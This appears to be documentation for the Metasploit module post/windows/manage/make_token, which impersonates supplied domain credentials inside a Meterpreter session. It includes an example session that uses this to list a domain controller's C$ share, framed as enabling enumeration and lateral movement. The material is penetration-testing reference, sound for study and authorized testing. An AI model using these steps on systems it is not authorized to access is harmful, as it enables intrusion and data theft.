## Vulnerable Application
In its default configuration, this module creates a new network security context with the specified
logon data (username, domain and password). Under the hood, Meterpreter's access token is cloned, and
a new logon session is created and linked to that token. The token is then impersonated to acquire
the new network security context. This module has no effect on local actions - only on remote ones
(where the specified credential material will be used). This module does not validate the credentials
specified.

## Verification Steps

1. Start msfconsole
2. Get a Meterpreter session
3. Do: `use post/windows/manage/make_token`
4. Set the `USERNAME`, `PASSWORD` and `DOMAIN` options
5. Run the module

## Options
### USERNAME
Username to use

### PASSWORD
Password to use

### DOMAIN
Domain to use

### LOGONTYPE
The type of logon operation to perform (defaults to `LOGON32_LOGON_NEW_CREDENTIALS`)

### LOGONTYPE
This module defaults to `LOGON32_LOGON_NEW_CREDENTIALS` so as to mimic the behaviour of Cobalt Strike's
[`make_token`](https://www.cobaltstrike.com/blog/windows-access-tokens-and-alternate-credentials/) command.
However, any valid LOGONTYPE for the LogonUser function can be specified. More details can be found at
<https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera>, by checking the
`dwLogonType` flag.

## Scenarios
This module can be used as an alternative to modules like `post/windows/manage/run_as` or
`post/windows/manage/run_as_psh`, which require the creation of a new process. This module impersonates the specified
credentials in the current Meterpreter session, which can be leveraged to enum or move laterally to other systems on
behalf of the impersonated user.

### Limitations
In its default configuration, this module does not require privileges to create a new security context (new access
token). Despite of this, some actions with the new token might require privileges. For example, in order to create a
process with an access token - with functions like [CreateProcessAsUser](https://learn.microsoft.com/en-
us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) or
[CreateProcessWithToken](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- administrative privileges are needed. This means that if you use this module with a non-privileged user, your new
processes will not inherit `make_token`'s security context.

### Example

```
meterpreter > getuid
Server username: CAP\vegeta
meterpreter > ls \\\\dc01\\C$
[-] stdapi_fs_stat: Operation failed: Access is denied.
meterpreter > run post/windows/manage/make_token username=bulma_da password=Patatas123 domain=capsule.corp

[*] Executing rev2self to revert any previous token impersonations
[*] Executing LogonUserA with the flag LOGON32_LOGON_NEW_CREDENTIALS to create a new security context for capsule.corp\bulma_da
[*] Impersonating the new security context...
[+] The session should now run with the new security context!
[!] Remember that this will not have any effect on local actions (i.e. getuid will still show the original user)
meterpreter > ls \\\\dc01\\C$
Listing: \\dc01\C$
==================

Mode              Size       Type  Last modified              Name
----              ----       ----  -------------              ----
040777/rwxrwxrwx  0          dir   2021-05-08 10:20:24 +0200  $Recycle.Bin
040777/rwxrwxrwx  0          dir   2023-05-19 12:06:35 +0200  $WinREAgent
040777/rwxrwxrwx  0          dir   2023-05-19 09:44:10 +0200  Documents and Settings
100666/rw-rw-rw-  12288      fil   2023-06-06 09:25:56 +0200  DumpStack.log.tmp
040777/rwxrwxrwx  0          dir   2021-05-08 10:20:24 +0200  PerfLogs
040555/r-xr-xr-x  0          dir   2023-05-19 09:53:15 +0200  Program Files
040777/rwxrwxrwx  0          dir   2021-05-08 11:40:15 +0200  Program Files (x86)
040777/rwxrwxrwx  0          dir   2023-05-19 09:44:33 +0200  ProgramData
040777/rwxrwxrwx  0          dir   2023-05-19 09:44:10 +0200  Recovery
040777/rwxrwxrwx  0          dir   2023-05-19 09:55:58 +0200  System Volume Information
040555/r-xr-xr-x  0          dir   2023-05-19 09:44:15 +0200  Users
040777/rwxrwxrwx  0          dir   2023-05-19 09:52:08 +0200  Windows
100666/rw-rw-rw-  402653184  fil   2023-06-06 09:25:56 +0200  pagefile.sys
```
